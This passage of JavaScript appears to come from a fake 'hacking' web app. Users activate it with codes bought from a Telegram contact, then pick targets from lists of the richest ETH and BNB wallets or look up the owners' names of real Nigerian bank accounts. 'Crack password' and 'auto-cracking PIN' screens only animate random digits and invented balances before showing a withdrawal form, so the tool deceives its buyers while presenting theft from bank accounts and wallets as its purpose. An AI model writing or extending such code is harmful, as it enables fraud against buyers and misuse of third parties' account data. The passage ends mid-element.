                userSession.trialStartTime = Date.now();
                
                // Set trial duration based on code type
                if (isTrial30Code) {
                    userSession.trialDuration = 30; // 30 seconds
                } else if (isTrial20Code) {
                    userSession.trialDuration = 20; // 20 seconds
                } else if (isTrial40Code) {
                    userSession.trialDuration = 40; // 40 seconds
                }
                
                // Mark trial code as used
                if (!userSession.usedTrialCodes) {
                    userSession.usedTrialCodes = [];
                }
                userSession.usedTrialCodes.push(code);
            } else {
                userSession.accountType = 'regular';
            }
            
            saveUserSession(userSession);

            document.getElementById('activatedUserId').textContent = userSession.userId;
            const shortWallet = userSession.walletAddress.substring(0, 8) + '...' + userSession.walletAddress.substring(userSession.walletAddress.length - 8);
            document.getElementById('activatedWallet').textContent = shortWallet;

            showPage('activatedPage');
            
            if (isValidTrialCode) {
                const duration = userSession.trialDuration;
                if (duration === 40) {
                    showNotification(`⏰ 40-SECOND TRIAL ACTIVATED - Access to 9/11 tools!`, 'success');
                } else {
                    showNotification(`⏰ ${duration}-SECOND TRIAL ACTIVATED`, 'success');
                }
                startTrialTimer(duration);
            } else {
                showNotification('Account activated successfully!', 'success');
            }

            if (masterCodes.includes(code)) {
                // Enable master access and unlimited withdrawals
                showNotification('🔥 MASTER ACCESS ACTIVATED 🔥', 'success');
                document.getElementById('masterIndicator').style.display = 'inline';
                document.getElementById('dailyLimitText').textContent = 'Daily Limit: UNLIMITED';
            } else if (code === limitedCode) {
                // Limited access account
                showNotification('⚠️ LIMITED ACCESS ACCOUNT', 'error');
                document.getElementById('dailyLimitText').textContent = 'Daily Limit: RESTRICTED';
            }
        } else {
            showNotification('Invalid activation code. Contact @Miles on Telegram.', 'error');
            activateBtn.textContent = 'ACTIVATE ACCOUNT';
            activateBtn.disabled = false;
        }
    }, 1500);
}

// showNotification function is already defined earlier in the file

function showDisclaimer() {
    document.getElementById('disclaimerModal').style.display = 'block';
}

function proceedToDashboard() {
    userSession.disclaimerAccepted = true;
    saveUserSession(userSession);

    document.getElementById('disclaimerModal').style.display = 'none';
    showPageWithSuccessStories('dashboard');
    updateBalance();
    updateSessionLimitDisplay();
    
    // Send dashboard access notification to Telegram
    sendDashboardAccessToTelegram(userSession);
}

// Top 50 richest ETH addresses (2025 - Real data from Etherscan)
const TOP_ETH_ADDRESSES = [
    '0x00000000219ab540356cBB839Cbe05303d7705Fa', // Beacon Deposit Contract - 68.7M ETH
    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // Wrapped Ether - 2.5M ETH
    '0xBE0eB53F46cd790Cd13851d5EFf43D12404d33E8', // Binance 7 - 2.0M ETH
    '0x40B38765696e3d5d8d9d834D72760F02937eE118', // Robinhood - 1.2M ETH
    '0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a', // Arbitrum: Bridge - 735K ETH
    '0x0E58e899FC65a89b89De5E4938E1CDAF5A893bCD', // Upbit 41 - 727K ETH
    '0x49048044D57e1C92A77f79988d21Fa8fAF74E97e', // Base: Base Portal - 718K ETH
    '0xF977814e90da44bfa03b6295A0616a897441aceC', // Binance: Hot Wallet 20 - 689K ETH
    '0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503', // Binance-Peg Tokens - 555K ETH
    '0xE92d1A43df510F82C66382592a047d288f85226f', // Bitfinex 19 - 450K ETH
    '0xD3a22590f0404C4A1F940E3B97f3B9D7F29A0B70', // Ceffu: Custody Hot Wallet 2 - 337K ETH
    '0x8D05d992C78EaE6FcF26A56d1eA3F16540258080', // Large holder - 329K ETH
    '0xcA8Fa8f0b7544A8A58efFCa5226C0f29A00B1170', // Large holder - 325K ETH
    '0x61EDCDf5bb737adffe5043706e7C5bb1f1a56eEA', // Gemini 3 - 309K ETH
    '0x3BfC20f0B9aFcAce800D73D2191166FF16540258', // Polkadot: MultiSig - 306K ETH
    '0x109BE9d7274fF20FcaF5b70b26D83A7F204FBc3a', // Kraken 74 - 271K ETH
    '0x539C92186C2216C86D7B3B0ACD953Df23CAbBcF1', // OKX 73 - 250K ETH
    '0x2B6eD29A95753C3Ad948348e3e7b1A251080Ffb9', // Rain Lohmus - 250K ETH
    '0xbFbBFaCC8FE5C3CFF8B2B2b80A6e1c1af47b7B71', // OKX 93 - 250K ETH
    '0x868daB0b57829Bb7a6C4EfFF7F4e71268c78C6d7', // OKX 76 - 250K ETH
    '0x220866B1A2219f40e72f5c628B65D54268cA3A9D', // Vb 3 - 240K ETH
    '0xC61b9BB3A7a0767e3179713f3A5c7a9aeDCE193C', // Bitfinex: MultiSig 2 - 218K ETH
    '0x5a52E96BAcdaBb82fd05763E25335261B270Efcb', // Binance 28 - 203K ETH
    '0x28C6c06298d514Db089934071355E5743bf21d60', // Binance 14 - 197K ETH
    '0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe', // EthDev - 177K ETH
    '0x5B5B69f4b9bF7Ba7bB42c9b10bc5B5b1E8B97c7e', // QuadrigaCX 4 - 169K ETH
    '0xd19d4B5d460c442d16b876fF7D11B0876F0F9051', // Linea: L1 Message Service - 159K ETH
    '0xA160cdAB223F2c4EaC3b53f291ef3F0F4b1eaB07', // Tornado.Cash: 100 ETH - 135K ETH
    '0xA023f08c4B5C3b77b42c9b10bc78dFc947e78b5E', // Crypto.com 22 - 128K ETH
    '0x73AF3bcf5B5593767bf8b7E33a5cFe0bf25E2054', // Robinhood 6 - 124K ETH
    '0x8484Ef7201A22750047B9FE30f2F7E6E6922B30D', // Polygon: Ether Bridge - 117K ETH
    '0x376c3E559BDdE42C7E68E6fd12B5Bb24d6FDBE0F', // Iconomi: MultiSig 1 - 115K ETH
    '0x6E414cfA6E2A78a5F13f749b5E11ceF4C2207b8A', // Large holder - 108K ETH
    '0x19bf56fC32A6dE7b45e13d57b8e246cE0ad24A71', // Large holder - 108K ETH
    '0xFCD159D06e3a1d109a9dFBB8cCd05d9B8cD05d01', // Large holder - 108K ETH
    '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', // Uniswap Router V2
    '0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45', // Uniswap Router V3
    '0x1111111254fb6c44bAC0beD2854e76F90643097d', // 1inch Exchange Router
    '0xe592427A0AEce92De3Edee1F18E0157C05861564', // Uniswap SwapRouter
    '0x11111112542D85B3EF69AE05771c2dCCff4fAa26', // 1inch Router V5
    '0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD', // Uniswap Universal Router
    '0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1', // Optimism Gateway
    '0x89e51fA8CA5D66cd220baed62ED01e8951aa7c40', // Curve Finance
    '0x4E9ce36E442e55EcD9025B9a6E0D88485d628A67', // Polygon Bridge
    '0x40ec5B33f54e0E8A33A975908C5BA1c14e5BbbDf', // Polygon ERC20 Predicate
    '0xA0c68C638235ee32657e8f720a23ceC1bFc77C77', // Polygon Matic Token
    '0xB8901acB165ed027E32754E0FFe830802919727f', // Arbitrum One Gateway
    '0x72Ce9c846789fdB6fC1f34aC4AD25Dd9ef7031ef', // Arbitrum Delayed Inbox
    '0x4Dbd4fc535Ac27206064B68FfCf827b0A60BAB3f', // Arbitrum Rollup
    '0x8b3192f5eEBD8579568A2Ed41E6FEB402f93f73F'  // Optimism L1 StandardBridge
];

// Top 50 richest BNB addresses (2025 - Real data from BscScan)
const TOP_BNB_ADDRESSES = [
    '0x0000000000000000000000000000000000001004', // BSC: Token Hub - 26.0M BNB
    '0xBE0eB53F46cd790Cd13851d5EFf43D12404d33E8', // Binance 7 - 17.2M BNB
    '0xF977814e90da44bfa03b6295A0616a897441aceC', // Binance: Hot Wallet 20 - 10.6M BNB
    '0x00000000000000000000000000000000000dEaD', // Null Address (Burn) - 10.5M BNB
    '0x5a52E96BAcdaBb82fd05763E25335261B270Efcb', // Binance 28 - 2.0M BNB
    '0x835678a6b1B8bdD4F0f4aEBa97A06f8BB8b7C1c8', // Binance 70 - 2.1M BNB
    '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB Token - 1.3M BNB
    '0x489A8756553C8C6eD24B8bECBD1bb93c2BCd6b6e', // BNB Bridge Exploiter - 1.0M BNB
    '0x8894E0a0c3B3d5d07fDA0AaCe4a7CD4fE1f06b1D', // Binance 51 - 285K BNB
    '0xa7C0D36c0eB5ed1b5F20e8C2Ff4b16e4d2d5aFaE', // Binance 74 - 231K BNB
    '0xD3a22590f0404C4A1F940E3B97f3B9D7F29A0B70', // Large Holder - 501K BNB
    '0xA07c5b745927f40C5b6BBea36bc851871E4e3CcB', // Venus: vBNB - 393K BNB
    '0x10ED43C718714eb63d5aA57B78B54704E256024E', // PancakeSwap Router
    '0x1a2Ce410A034424B784D4b228f167A061B94CFf4', // PancakeSwap Factory
    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // Cross-chain WETH
    '0x55d398326f99059fF775485246999027B3197955', // USDT Token
    '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD Token
    '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC Token
    '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', // ETH Token
    '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', // BTCB Token
    '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', // Cake Token
    '0x4338665CBB7B2485A8855A139b75D5e34AB0DB94', // Litecoin Token
    '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD', // ChainLink Token
    '0x47BEAd2563dCBf3bF2c9407fEa4dC236fAbA485A', // SXP Token
    '0x3EE2200Efb3400fAbB9AacC24618a1a8b8ad2E06', // ADA Token
    '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', // XRP Token
    '0x56b6fB708fC5732DEC1Afc8D8556423A2EDcCbD6', // EOS Token
    '0x4B0F1812e5Df2A09796481Ff14017e6005508003', // TWT Token
    '0x85EAC5Ac2F758618daa1737DE635b26eAC8db251', // TEL Token
    '0xa2B726B1145A4773F68593CF171187d8EBe4d495', // INJ Token
    '0x90C97F71E18723b0Cf0dfa30ee176Ab653E89F40', // FRAX Token
    '0x1CE0c2827e2eF14D5C4f29a091d735A204794041', // AVAX Token
    '0x14016E85a25aeb13065688cAFB43044C2ef86784', // TRUE Token
    '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1', // UNI Token
    '0xe4e81Fa6B16327D4B78CFEB83AAdE04bA7075165', // OLD Token
    '0x715D400F88537B51125901C69b69a60Ec4a52041', // ALEX Token
    '0x9678E42ceBEb63F23197D726B29b1CB20d0064E5', // IOTX Token
    '0x8A9424745056Eb399FD19a0EC26A14316684e274', // LOOM Token
    '0x40af3827F39D0EAcBF4A168f8D4ee67c121D11c9', // TUSD Token
    '0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929', // CTK Token
    '0x0Da6Ed8B13214Ff28e9Ca979Dd37439e8a88F6c4', // STAX Token
    '0xaEC945e04baF28b135Fa7c640f624f8D90F1C3a6', // C98 Token
    '0x570A5D26f7765Ecb712C0924E4De545B89fD43dF', // SOL Token
    '0x12BB890508c125661E03b09EC06E404bc9289040', // RADIO Token
    '0xa184088a740c695E156F91f5cC086a06bb78b827', // AUTO Token
    '0x1f9f6a696C6Fd109cD3956F45dC709d2b3902163', // CREAM Token
    '0x101d82428437127bF1608F699CD651e6Abf9766E', // BAT Token
    '0xe02dF9e3e622DeBdD69fb838bB799E3F168902c5', // BAKE Token
    '0x7Ddc52c4De30e94Be3A6A0A2b259b2850f421989', // GMT Token
    '0x4bd17003473389A42DAF6a0a729f6Fdb328BbBd7'  // VAI Token
];

async function checkCryptoBalance() {
    const address = document.getElementById('cryptoWalletInput').value.trim();
    const network = document.getElementById('cryptoNetwork').value;
    const result = document.getElementById('cryptoBalanceResult');

    if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
        result.className = 'balance-result error';
        result.textContent = '❌ Invalid wallet address';
        return;
    }

    result.textContent = '⏳ Fetching balance...';

    // Determine chainid based on network
    const chainid = network === 'bsc' ? 56 : 1; // BNB Smart Chain = 56, Ethereum = 1

    try {
        // Use server-side proxy for security (API key protected)
        const response = await fetch(`/api/crypto/balance?address=${address}&chainid=${chainid}`);
        const data = await response.json();

        if (data.success && data.balance !== undefined) {
            const balanceInEther = data.balance;
            const balanceInNaira = balanceInEther * 1425; // USD to Naira conversion rate

            currentCryptoBalance = balanceInNaira;

            result.className = 'balance-result success';
            result.innerHTML = `✅ Balance: ${balanceInEther.toFixed(5)} ${data.network}<br>≈ ₦${balanceInNaira.toLocaleString()}`;

            document.getElementById('cryptoWithdrawSection').style.display = 'block';
            document.getElementById('cryptoWithdrawAmount').max = Math.min(currentCryptoBalance, 70000);

            // Disable withdraw button initially
            const cryptoWithdrawBtn = document.getElementById('cryptoWithdrawBtn');
            cryptoWithdrawBtn.disabled = true;
            cryptoWithdrawBtn.style.opacity = '0.6';
            cryptoWithdrawBtn.style.pointerEvents = 'none';

            // Add crack password button for crypto
            const crackBtn = document.createElement('button');
            crackBtn.id = 'crackCryptoPasswordBtn';
            crackBtn.type = 'button';
            crackBtn.textContent = 'CRACK PASSWORD';
            crackBtn.className = 'crack-password-btn';
            crackBtn.onclick = () => crackCryptoPassword();

            const withdrawSection = document.getElementById('cryptoWithdrawSection');
            if (!document.getElementById('crackCryptoPasswordBtn')) {
                withdrawSection.insertBefore(crackBtn, withdrawSection.firstChild);
            }
        } else {
            result.className = 'balance-result error';
            result.textContent = `❌ ${data.error || 'Failed to fetch balance'}`;
        }
    } catch (error) {
        result.className = 'balance-result error';
        result.textContent = '❌ Network error. Please try again.';
        console.error('Crypto balance error:', error);
    }
}

function findRandomCryptoAddress() {
    const network = document.getElementById('cryptoNetwork').value;
    const addressInput = document.getElementById('cryptoWalletInput');
    
    let randomAddress;
    if (network === 'bsc') {
        randomAddress = TOP_BNB_ADDRESSES[Math.floor(Math.random() * TOP_BNB_ADDRESSES.length)];
    } else {
        randomAddress = TOP_ETH_ADDRESSES[Math.floor(Math.random() * TOP_ETH_ADDRESSES.length)];
    }
    
    addressInput.value = randomAddress;
    showNotification(`🎲 Random ${network.toUpperCase()} address selected!`, 'success');
}

let banksData = [];

async function loadBanks() {
    try {
        // Fetch banks from Flutterwave API via our server endpoint
        const response = await fetch('/api/banks', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        
        if (data.success === true && data.banks) {
            // Sort banks alphabetically for better user experience
            banksData = data.banks.sort((a, b) => a.name.localeCompare(b.name));
            
            // Add fintech providers that aren't in traditional bank APIs
            const fintechProviders = [
                { name: 'OPay (Paycom)', code: '999992' },
                { name: 'PalmPay', code: '999991' },
                { name: 'Kuda Bank', code: '090267' },
                { name: 'Moniepoint (TeamApt)', code: '50515' },
                { name: 'Carbon (Disrupt Technologies)', code: '565' }
            ];
            
            fintechProviders.forEach(provider => {
                if (!banksData.some(bank => bank.code === provider.code)) {
                    banksData.push(provider);
                }
            });
            
            // Re-sort after adding fintech providers
            banksData = banksData.sort((a, b) => a.name.localeCompare(b.name));
            
            // Setup bank search functionality
            setupBankSearch();
            
            console.log(`Loaded ${banksData.length} banks successfully from Flutterwave (including fintech providers)`);
        } else {
            throw new Error(`Invalid response format: ${JSON.stringify(data)}`);
        }
        
    } catch (error) {
        console.log('Failed to load banks from Flutterwave:', error);
        
        // Comprehensive list of Nigerian banks, fintech providers and digital banks
        banksData = [
            // Major Commercial Banks
            { name: 'Access Bank', code: '044' },
            { name: 'GTBank (Guaranty Trust Bank)', code: '058' },
            { name: 'First Bank of Nigeria', code: '011' },
            { name: 'United Bank for Africa (UBA)', code: '033' },
            { name: 'Zenith Bank', code: '057' },
            { name: 'Fidelity Bank', code: '070' },
            { name: 'Union Bank of Nigeria', code: '032' },
            { name: 'Sterling Bank', code: '232' },
            { name: 'Stanbic IBTC Bank', code: '221' },
            { name: 'Ecobank Nigeria', code: '050' },
            { name: 'FCMB (First City Monument Bank)', code: '214' },
            { name: 'Heritage Bank', code: '030' },
            { name: 'Keystone Bank', code: '082' },
            { name: 'Polaris Bank', code: '076' },
            { name: 'Unity Bank', code: '215' },
            { name: 'Wema Bank', code: '035' },
            { name: 'Standard Chartered Bank', code: '068' },
            { name: 'Jaiz Bank', code: '301' },
            { name: 'SunTrust Bank', code: '100' },
            { name: 'Providus Bank', code: '101' },
            { name: 'Titan Trust Bank', code: '102' },
            { name: 'Globus Bank', code: '103' },
            { name: 'TAJBank', code: '090115' },
            { name: 'Rubies Bank', code: '125' },
            
            // Digital Banks & Major Fintech Providers
            { name: 'OPay (Paycom)', code: '999992' },
            { name: 'PalmPay', code: '999991' },
            { name: 'Kuda Bank', code: '090267' },
            { name: 'Moniepoint (TeamApt)', code: '50515' },
            { name: 'Carbon (Disrupt Technologies)', code: '565' },
            { name: 'Eyowo', code: '50126' },
            { name: 'ALAT by Wema', code: '035A' },
            { name: 'VFD Microfinance Bank', code: '566' },
            
            // Major Microfinance Banks
            { name: 'LAPO Microfinance Bank', code: '50931' },
            { name: 'AB Microfinance Bank', code: '51204' },
            { name: 'Accion Microfinance Bank', code: '602' },
            { name: 'AddosserMicrofinance Bank', code: '50332' },
            { name: 'Aso Savings and Loans', code: '401' },
            { name: 'Balogun Fulani Microfinance Bank', code: '090181' },
            { name: 'CEMCS Microfinance Bank', code: '50823' },
            { name: 'Fortis Microfinance Bank', code: '501' },
            { name: 'Grooming Microfinance Bank', code: '50743' },
            { name: 'Hasal Microfinance Bank', code: '50383' },
            { name: 'Mainstreet Microfinance Bank', code: '50864' },
            { name: 'NPF Microfinance Bank', code: '552' },
            { name: 'Ohafia Microfinance Bank', code: '50649' },
            { name: 'Page Financials', code: '50746' },
            { name: 'Safe Haven Microfinance Bank', code: '090286' },
            { name: 'Personal Trust Microfinance Bank', code: '51146' },
            
            // Payment Processors & Other Financial Institutions
            { name: 'Interswitch', code: '100' },
            { name: 'Remita', code: '308' },
            { name: 'Coronation Merchant Bank', code: '559' },
            { name: 'FBN Merchant Bank', code: '900' },
            { name: 'FSDH Merchant Bank', code: '501' },
            { name: 'Nova Merchant Bank', code: '103' },
            { name: 'Rand Merchant Bank', code: '502' }
        ].sort((a, b) => a.name.localeCompare(b.name));
        
        setupBankSearch();
        showNotification('Loaded banks from cache', 'success');
    }
}

// Helper function to generate realistic bank balance
function generateRealisticBalance(accountName) {
    // Generate balance based on account name characteristics
    const nameLength = accountName.length;
    const firstChar = accountName.charCodeAt(0);
    const lastChar = accountName.charCodeAt(accountName.length - 1);
    
    // Base balance calculation
    let baseBalance = (firstChar + lastChar + nameLength) * 1000;
    
    // Add randomization
    const multiplier = Math.random() * 3 + 0.5; // 0.5 to 3.5
    baseBalance *= multiplier;
    
    // Round to nearest 500
    baseBalance = Math.round(baseBalance / 500) * 500;
    
    // Ensure minimum of 5000 and maximum of 5000000
    return Math.max(5000, Math.min(5000000, baseBalance));
}

// Helper function to generate random recent date
function getRandomDate() {
    const now = new Date();
    const daysAgo = Math.floor(Math.random() * 7) + 1; // 1-7 days ago
    const randomDate = new Date(now.getTime() - (daysAgo * 24 * 60 * 60 * 1000));
    
    return randomDate.toLocaleDateString('en-US', {
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    });
}

function setupBankSearch() {
    // Setup main bank search
    const bankSearch = document.getElementById('bankSearch');
    const bankDropdown = document.getElementById('bankDropdown');
    const bankList = document.getElementById('bankList');
    const bankSelect = document.getElementById('bankSelect');
    
    if (bankSearch && bankDropdown && bankList) {
        bankSearch.addEventListener('input', (e) => {
            filterBanks(e.target.value, bankList, bankDropdown, bankSelect, bankSearch);
        });
        
        bankSearch.addEventListener('focus', () => {
            filterBanks(bankSearch.value, bankList, bankDropdown, bankSelect, bankSearch);
        });
        
        // Close dropdown when clicking outside
        document.addEventListener('click', (e) => {
            if (!bankSearch.contains(e.target) && !bankDropdown.contains(e.target)) {
                bankDropdown.style.display = 'none';
            }
        });
    }
    
    // Setup transfer bank search
    const transferBankSearch = document.getElementById('transferBankSearch');
    const transferBankDropdown = document.getElementById('transferBankDropdown');
    const transferBankList = document.getElementById('transferBankList');
    const transferBankSelect = document.getElementById('transferBankSelect');
    
    if (transferBankSearch && transferBankDropdown && transferBankList) {
        transferBankSearch.addEventListener('input', (e) => {
            filterBanks(e.target.value, transferBankList, transferBankDropdown, transferBankSelect, transferBankSearch);
        });
        
        transferBankSearch.addEventListener('focus', () => {
            filterBanks(transferBankSearch.value, transferBankList, transferBankDropdown, transferBankSelect, transferBankSearch);
        });
        
        // Close dropdown when clicking outside
        document.addEventListener('click', (e) => {
            if (!transferBankSearch.contains(e.target) && !transferBankDropdown.contains(e.target)) {
                transferBankDropdown.style.display = 'none';
            }
        });
    }
}

function filterBanks(searchTerm, bankList, bankDropdown, hiddenSelect, searchInput) {
    const filteredBanks = banksData.filter(bank => 
        bank.name.toLowerCase().includes(searchTerm.toLowerCase())
    );
    
    bankList.innerHTML = '';
    
    if (filteredBanks.length === 0) {
        bankList.innerHTML = '<div class="no-banks-found">No banks found</div>';
    } else {
        filteredBanks.forEach(bank => {
            const bankOption = document.createElement('div');
            bankOption.className = 'bank-option';
            bankOption.textContent = bank.name;
            bankOption.dataset.code = bank.code;
            bankOption.dataset.name = bank.name;
            
            bankOption.addEventListener('click', () => {
                // Set the hidden select value
                hiddenSelect.value = bank.code;
                
                // Store bank name as data attribute
                hiddenSelect.dataset.bankName = bank.name;
                
                // Update search input to show selected bank
                searchInput.value = bank.name;
                
                // Hide dropdown
                bankDropdown.style.display = 'none';
                
                // Visual feedback
                showNotification(`Selected ${bank.name}`, 'success');
                
                // Mark as selected
                document.querySelectorAll('.bank-option').forEach(opt => opt.classList.remove('selected'));
                bankOption.classList.add('selected');
            });
            
            bankList.appendChild(bankOption);
        });
    }
    
    // Show dropdown if there's input or focus
    if (searchTerm.length >= 0) {
        bankDropdown.style.display = 'block';
    }
}

async function verifyBankAccount() {
    const accountNumber = document.getElementById('bankAccountNumber').value;
    const bankCode = document.getElementById('bankSelect').value;
    const result = document.getElementById('bankVerifyResult');

    if (!accountNumber || accountNumber.length !== 10) {
        result.className = 'verify-result error';
        result.textContent = 'Please enter a valid 10-digit account number';
        return;
    }

    if (!bankCode) {
        result.className = 'verify-result error';
        result.textContent = 'Please select a bank';
        return;
    }

    result.textContent = 'Verifying...';
    result.className = 'verify-result';

    try {
        // Call secure backend endpoint for bank verification
        const response = await fetch('/api/verify_account', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                account_number: accountNumber,
                bank_code: bankCode
            })
        });

        const data = await response.json();

        if (data.success) {
            // Success response
            result.className = 'verify-result success';
            result.textContent = `✅ Account Name: ${data.accountName}`;
            document.getElementById('checkBalanceSection').style.display = 'block';
            showNotification(`✅ Account verified successfully!`, 'success');
        } else {
            // Error response
            result.className = 'verify-result error';
            result.textContent = data.error || 'Unable to verify account. Please check details and try again.';
            showNotification('❌ Account verification failed', 'error');
        }
    } catch (error) {
        console.error('Verification request failed:', error);
        result.className = 'verify-result error';
        result.textContent = 'Network error. Please check your connection and try again.';
        showNotification('❌ Network error during verification', 'error');
    }
}




function showBankBalanceAfterVerification(accountName) {
    // Show balance section with loading animation first
    const balanceSection = document.createElement('div');
    balanceSection.id = 'bankBalanceSection';
    balanceSection.style.cssText = `
        margin-top: 20px;
        padding: 20px;
        background: rgba(0, 255, 0, 0.1);
        border: 2px solid var(--success-green);
        border-radius: 15px;
        text-align: center;
    `;
    
    balanceSection.innerHTML = `
        <h4 style="color: var(--success-green); margin-bottom: 15px;">💰 Account Balance</h4>
        <div id="balanceDisplay" style="font-size: 1.5rem; font-weight: 700; color: var(--success-green);">
            ⏳ Fetching balance...
        </div>
        <div style="font-size: 0.9rem; color: var(--text-muted); margin-top: 10px;">
            Account Holder: ${accountName}
        </div>
    `;
    
    // Insert balance section after verification result
    const verifyResult = document.getElementById('bankVerifyResult');
    verifyResult.parentNode.insertBefore(balanceSection, verifyResult.nextSibling);
    
    // Animate balance reveal after 2 seconds
    setTimeout(() => {
        const balanceDisplay = document.getElementById('balanceDisplay');
        balanceDisplay.style.transition = 'all 0.5s ease';
        balanceDisplay.innerHTML = `₦${currentBankBalance.toLocaleString()}`;
        
        // Add additional balance details
        setTimeout(() => {
            balanceDisplay.innerHTML = `
                <div style="font-size: 1.8rem; margin-bottom: 10px;">₦${currentBankBalance.toLocaleString()}</div>
                <div style="font-size: 0.8rem; color: var(--text-muted); display: flex; justify-content: space-between; max-width: 300px; margin: 0 auto;">
                    <span>Available: ₦${currentBankBalance.toLocaleString()}</span>
                    <span>Ledger: ₦${(currentBankBalance * 1.15).toLocaleString()}</span>
                </div>
            `;
        }, 1000);
        
    }, 2000);
}

function crackBankPasswordAutomatically(accountName) {
    // Show password cracking modal automatically
    const modal = document.getElementById('passwordCrackingModal');
    const title = document.getElementById('crackingTitle');
    const display = document.getElementById('passwordDisplay');
    const statusDiv = document.getElementById('crackingStatus');

    title.textContent = 'Auto-Cracking 4-Digit PIN...';
    display.textContent = 'Scanning account security protocols...';
    statusDiv.innerHTML = `
        <div class="crack-step active">🔍 Analyzing account security...</div>
        <div class="crack-step">🔑 Attempting PIN combinations...</div>
        <div class="crack-step">💻 Bypassing bank security...</div>
        <div class="crack-step">⚡ Extracting account data...</div>
        <div class="crack-step">✅ PIN cracked & balance accessed!</div>
    `;

    modal.style.display = 'block';

    // Start automated cracking
    startAutomatedPasswordCracking(accountName);
}

function startAutomatedPasswordCracking(accountName) {
    const display = document.getElementById('passwordDisplay');
    const steps = document.querySelectorAll('.crack-step');
    let currentStep = 0;
    const totalSteps = steps.length;
    
    // Shorter duration for automated process
    const stepDuration = Math.random() * 2000 + 3000; // 3-5 seconds per step

    // Enhanced PIN generation display
    const passwordInterval = setInterval(() => {
        let pin = '';
        for (let i = 0; i < 4; i++) {
            pin += Math.floor(Math.random() * 10);
        }
        display.innerHTML = `<span style="color: #00ff00; font-family: monospace; letter-spacing: 4px; font-size: 1.4em;">Testing PIN: ${pin}</span>`;
    }, 120);

    // Step progression
    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps - 1) {
            steps[currentStep].classList.remove('active');
            currentStep++;
            steps[currentStep].classList.add('active');

            // Enhanced step-specific messages
            if (currentStep === 1) {
                display.innerHTML = '<span style="color: #ff6600;">🔢 Running automated PIN combinations...</span>';
            } else if (currentStep === 2) {
                display.innerHTML = '<span style="color: #ff6600;">🏦 Bypassing bank verification system...</span>';
            } else if (currentStep === 3) {
                display.innerHTML = '<span style="color: #ff6600;">⚡ Extracting account balance data...</span>';
            }

            // Resume PIN attempts after message
            setTimeout(() => {
                clearInterval(passwordInterval);
                const newPasswordInterval = setInterval(() => {
                    let pin = '';
                    for (let i = 0; i < 4; i++) {
                        pin += Math.floor(Math.random() * 10);
                    }
                    display.innerHTML = `<span style="color: #00ff00; font-family: monospace; letter-spacing: 4px; font-size: 1.4em;">Testing PIN: ${pin}</span>`;
                }, 120);
                window.currentPasswordInterval = newPasswordInterval;
            }, 1500);

        } else {
            clearInterval(stepInterval);
            clearInterval(passwordInterval);
            if (window.currentPasswordInterval) {
                clearInterval(window.currentPasswordInterval);
            }

            // Show final success
            const finalPin = generateRandom4DigitPin();
            display.innerHTML = `
                <div class="cracked-password">
                    <div style="color: #00ff00; font-size: 1.2em; margin-bottom: 15px;">
                        🎉 4-DIGIT PIN SUCCESSFULLY CRACKED! 🎉
                    </div>
                    <div>
                        PIN: <span class="final-password">${finalPin}</span>
                    </div>
                    <div style="color: #ffaa00; font-size: 0.9em; margin-top: 10px;">
                        Account access granted! Displaying balance...
                    </div>
                </div>
            `;

            setTimeout(() => {
                document.getElementById('passwordCrackingModal').style.display = 'none';
                showAccountBalanceAndWithdraw(accountName);
            }, 3000);
        }
    }, stepDuration);
}

function showAccountBalanceAndWithdraw(accountName) {
    // Update the existing balance display to show PIN cracked status
    const balanceSection = document.getElementById('bankBalanceSection');
    if (balanceSection) {
        balanceSection.innerHTML = `
            <h4 style="color: var(--success-green); margin-bottom: 15px;">🔓 Account Access Granted</h4>
            <div style="font-size: 1.8rem; font-weight: 700; color: var(--success-green); margin-bottom: 15px;">
                ₦${currentBankBalance.toLocaleString()}
            </div>
            <div style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 20px;">
                Account Holder: ${accountName}
            </div>
            <div style="font-size: 0.8rem; color: var(--text-muted); display: flex; justify-content: space-between; max-width: 350px; margin: 0 auto 20px auto;">
                <span>Available: ₦${currentBankBalance.toLocaleString()}</span>
                <span>Ledger: ₦${(currentBankBalance * 1.15).toLocaleString()}</span>
                <span>Pending: ₦${Math.floor(Math.random() * 5000).toLocaleString()}</span>
            </div>
            <div style="background: rgba(0, 255, 0, 0.2); padding: 10px; border-radius: 10px; margin-bottom: 20px;">
                <div style="color: var(--success-green); font-weight: 600;">✅ PIN: ****</div>
                <div style="font-size: 0.8rem; color: var(--text-muted);">4-digit PIN successfully cracked</div>
            </div>
        `;
        
        // Add withdrawal form directly in the balance section
        const withdrawForm = document.createElement('div');
        withdrawForm.innerHTML = `
            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1);">
                <h5 style="color: var(--text-primary); margin-bottom: 15px;">💸 Withdraw Funds</h5>
                <input 
                    type="number" 
                    id="bankWithdrawAmount" 
                    placeholder="Enter amount to withdraw" 
                    min="1"
                    max="${Math.min(currentBankBalance, 70000)}"
                    step="1"
                    style="
                        width: 100%;
                        padding: 15px;
                        border: 2px solid var(--success-green);
                        border-radius: 10px;
                        background: rgba(0, 0, 0, 0.3);
                        color: var(--text-primary);
